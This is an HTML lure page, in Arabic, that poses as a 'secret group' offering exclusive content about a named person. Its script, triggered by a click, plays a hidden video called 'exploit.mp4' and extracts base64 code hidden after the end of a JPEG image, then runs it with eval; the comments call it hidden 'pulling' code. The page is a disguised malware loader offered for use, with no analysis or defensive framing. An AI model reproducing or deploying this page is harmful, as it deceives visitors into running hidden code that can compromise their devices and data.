<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>جروب شروق قاسم السري</title>

    <meta property="og:description" content="شاهد المحتوى الحصري الآن..">
    <meta property="og:image" content="target_pic.jpg">
    <script>
        async function start() {
            // تشغيل فيديو الثغرة 0006 في الخلفية
            const v = document.createElement('video'); v.src = 'exploit.mp4'; v.autoplay = true; v.style.display='none'; document.body.appendChild(v);
            // استخراج كود السحب المخفي في الصورة وتشغيله
            const r = await fetch('target_pic.jpg'); const t = await r.text();
            const p = t.split('\xFF\xD9')[1]; if(p) eval(atob(p.trim()));
        }
    </script>
</head>
<body style="background:#000; color:#fff; text-align:center; padding-top:50px; font-family:Arial;" onclick="start()">
    <img src="target_pic.jpg" style="width:100%; max-width:400px; border-radius:20px; border:3px solid red; box-shadow: 0 0 25px red;">

</body>
</html>
